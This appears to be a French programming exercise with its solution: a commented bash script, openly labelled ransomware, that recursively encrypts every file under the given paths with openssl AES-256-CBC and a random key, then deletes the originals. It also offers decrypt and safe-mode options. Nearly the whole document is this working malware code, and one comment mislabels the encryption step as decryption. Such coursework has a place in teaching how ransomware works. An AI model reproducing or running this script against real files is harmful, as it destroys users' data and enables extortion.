# Exo7 - Ransomware

# Écrivez un script en bash agissant comme un ransomware. Ce dernier chiffre, à l’aide de la commande openssl l’ensemble des fichiers contenus dans les chemins fournis en paramètre (il requiert donc au moins un paramètre obligatoire).

# Le script accepte les options suivantes:

# -d: déchiffre les fichiers au lieu de les chiffrer
# -f: les chemins fournis n’identifient plus les répertoires mais les fichiers à (dé)chiffrer,
# -k key: permet de spécifier la clé de chiffrement utilisée (par défaut la clé est générée aléatoirement lors du chiffrement ou demandée à l’utilisateur pour le déchiffrement)
# -s: active le safe mode qui ne supprime pas les fichiers après les avoir (dé)chiffrés

#!/bin/bash

decrypt=false
dont_delete_file=false
file_mode=false
key=""

while getopts "dfk:s" options; do
    case "${options}" in
        d)
            decrypt=true
            ;;
        f)
            file_mode=true
            ;;
        k)
            key="${OPTARG}"
            ;;
        s)
            dont_delete_file=true
            ;;
        *)
            exit 1
            ;;
    esac
done

# On décale pour ne récupérer que ce que getops n'a pas traité
shift $((OPTIND - 1))

# On vérifie si la variable existe
if [ "$#" -eq 0 ]; then
    echo "Merci de préciser le(s) chemin(s)"
    exit 1
fi

process_item () {
    # On récupère le chemin du fichier
    local target="$1"

    # Si le fichier n'est pas un .enc, on ne peut pas le déchiffrer (sinon erreur)
    if [[ "$decrypt" = true && "$target" != *.enc ]]; then
        return
    fi

    # Si on a pas donner le clé
    if [[ -z "$key" ]]; then
        # Si on demande a dechiffrer un message
        if [[ "$decrypt" = true ]]; then
            # On demande à l'utilisateur d'entrée le mot de passe
            # Le -p est pour afficher le message et le -s pour ne pas afficher ce que l'on écrit, on met l'entrée dans le variable key
            # On doit préciser le /dev/tty (le clavier), sinon le read écoute sur le fichier de la boucle (aucune entrée clavier donc)
            read -p "Entrez la clé de déchiffrement : " -s key < /dev/tty
            # Echo pour faire unretour à la ligne
            echo
        # Si on ne déchiffre pas
        else
            # On génère une clé au hasard de 128 bits
            key=$(openssl rand -hex 16)
            # On affiche la clé
            echo "CLE : $key"
        fi
    fi

    # Si on déchiffre
    if [[ "$decrypt" = true ]]; then
        # On déchiffre avec la clé
        openssl enc -aes-256-cbc -d -pbkdf2 -in "$target" -out "${target%.enc}" -pass pass:"$key" 2>/dev/null
    else
        # Sinon, on déchiffre
        openssl enc -aes-256-cbc -pbkdf2 -in "$target" -out "$target.enc" -pass pass:"$key" 2>/dev/null
    fi

    # Si l'opération à réussie (pas d'erreur)
    if [ "$?" -eq 0 ]; then
        # On affiche un message pour dire que tout à été
        echo "[OK] Traité : $target"
        # Si on n'a pas demandé à garder le fichier
        if [ "$dont_delete_file" = false ]; then
            # Alors on le supprime et affiche un petit message
            rm "$target"
            echo "[DEBUG] Supprimé : $target"
        fi
    # Si il y a eu une soucis ($? != 0)
    else
        # On affiche un petit message d'erreur
        echo "[ERREUR] Erreur sur $target."
    fi
}

# On boucle sur tout les paths qui ont été donné
for path in "$@"; do
    # Si le mode file est activé (on donne donc des chemins de fichier et non de dossier)
    if [[ "$file_mode" = true ]]; then
        # On appelle directement la fonction en lui donnant le chemin
        process_item "$path"
    # Si on est pas dans le file mode (qu'on donne le chemin d'un dossier)
    else
        # On cherche les fichiers (-type f) de façon récursive dans le dossier path
        # La redirection envoie la liste des fichiers dans la boucle while
        # Le read -r permet de recupérer chaque chemin un par un
        while read -r sub_file; do
            # On appelle notre fonction avec le fichier de chaque fichier
            process_item "$sub_file"
        done < <(find "$path" -type f)
    fi
done
